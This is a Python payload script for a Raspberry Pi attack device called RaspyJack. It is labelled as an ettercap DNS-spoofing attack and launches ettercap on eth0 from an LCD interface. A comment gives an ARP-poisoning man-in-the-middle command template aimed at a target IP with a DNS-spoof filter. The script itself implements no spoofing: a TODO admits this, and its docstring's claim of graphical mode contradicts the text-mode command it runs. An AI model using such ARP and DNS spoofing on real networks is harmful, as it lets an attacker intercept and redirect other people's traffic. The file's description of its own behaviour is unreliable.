#!/usr/bin/env python3
"""
RaspyJack *payload* – **Attack: Ettercap DNS Spoofing**
========================================================
An alternative implementation of a DNS spoofing attack using the powerful
`ettercap` tool. This payload automates the process of running ettercap
in graphical mode to perform ARP poisoning and then spoof DNS replies.

**NOTE:** This payload is designed to launch `ettercap` and requires user
interaction with the `ettercap` interface itself, which is not displayed
on the LCD. It's a launcher for a more complex tool.
"""

import os, sys, subprocess, signal, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
ETH_INTERFACE = "eth0"

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

# --- Main ---
def show_message(lines, color="lime"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    y = 40
    for line in lines:
        d.text((10, y), line, font=FONT_TITLE, fill=color)
        y += 15
    LCD.LCD_ShowImage(img, 0, 0)

def run_attack():
    show_message(["Starting", "Ettercap..."])
    
    if subprocess.run("which ettercap", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "ettercap", "not found!"], "red")
        return

    # This command launches ettercap in graphical mode, which will not be visible.
    # It's intended to be run in an environment where the user can see the desktop.
    # For a headless device, a text-only command would be used.
    # TODO: Implement actual DNS spoofing configuration for text mode.
    command = f"ettercap -Tq -i {ETH_INTERFACE}" # -Tq for text mode, quiet
    
    try:
        # We don't wait for this to finish, it's a launcher
        # For actual DNS spoofing, you'd need to configure ettercap with a filter file and hosts.
        # Example: ettercap -Tq -i {ETH_INTERFACE} -F /path/to/dns_spoof.filter -M arp:remote /<target_ip>/
        subprocess.Popen(command, shell=True)
        show_message(["Ettercap", "launched in text", "mode. Needs config."])
    except Exception as e:
        show_message(["Launch FAILED!"], "red")
        print(f"Error launching ettercap: {e}", file=sys.stderr)

if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(5)
    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Ettercap launcher payload finished.")
